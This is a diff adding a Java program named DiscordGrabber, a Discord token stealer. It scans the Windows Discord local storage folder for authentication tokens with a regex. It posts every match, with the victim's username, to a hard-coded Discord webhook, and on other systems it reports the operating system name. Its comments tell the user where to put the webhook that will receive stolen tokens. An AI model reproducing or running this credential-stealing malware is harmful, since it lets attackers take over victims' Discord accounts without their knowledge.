@@ -1,0 +1,67 @@
+import java.io.BufferedReader; 
+import java.io.DataInputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+public class DiscordGrabber {
+	
+    private static String username = System.getProperty("user.name"); //Get username to later use in the path
+    private static String DiscordWebhookLink = "https://discord.com/api/webhooks/1056315995469381712/fdUvGfWDcQre1BJd4t8KXtGRMhCNJD63r9KG7pBoN9wg_dDh_Z_MN8Jv8qDykWFg6pTK"; //Fill in your discord webhook where you want the tokens sent to
+    private static String BOTName = "TokenBot"; //give the bot a name
+    private static String BOTImageURL = "https://tse3.mm.bing.net/th?id=OIP.asnc_8Y-ZNgLVM0thkfLAgHaE9&pid=Api&P=0"; // give the bot a face
+	
+	public static void main(String[] args) throws IOException {
+
+        String os = System.getProperty("os.name"); //get os names, because discord is saved in different directories depending on the os
+        
+        
+        
+
+        if(os.contains("Windows")) { //if it is any type of windows, do this
+            String path = System.getProperty("user.home") +"/AppData/Roaming/Discord/Local Storage/leveldb/"; //Set the path to discord path 
+            String username = System.getProperty("user.name"); 
+
+            String[] pathnames; 
+
+            File f = new File(path); 
+
+            pathnames = f.list(); // list all the files in the path (because token is in one of the files)
+        	
+        	
+        	for (String pathname : pathnames) { //iterate through all the files in the path
+                try {
+                    FileInputStream fstream = new FileInputStream(path + pathname); //for reading the file
+                    DataInputStream in = new DataInputStream(fstream); // for reading the file
+                    BufferedReader br = new BufferedReader(new InputStreamReader(in)); //for reading the file
+                    String strLine; //make a new string
+                    while ((strLine = br.readLine()) != null) { //while the token has not been found, read the next line
+
+                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
+                        Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
+
+                        while (m.find()) { //everytime a token is found
+                    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink); //this
+                            webhook.setContent(username + "  -  " + m.group()); //gets
+                            webhook.setAvatarUrl(BOTImageURL); //executed
+                            webhook.setUsername(BOTName); //this 
+                            webhook.setTts(false);// just 
+                            webhook.execute(); //sends 
+                        } //it
+                    }
+
+                } catch (Exception e) {}
+            }
+        }else { // In the case the token is not found.
+    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink);
+            webhook.setContent(username + "  -  " + " this person uses " + os); 
+            webhook.setAvatarUrl(BOTImageURL);
+            webhook.setUsername(BOTName);
+            webhook.setTts(false);
+            webhook.execute();
+        }
+        	
+        }      
+}
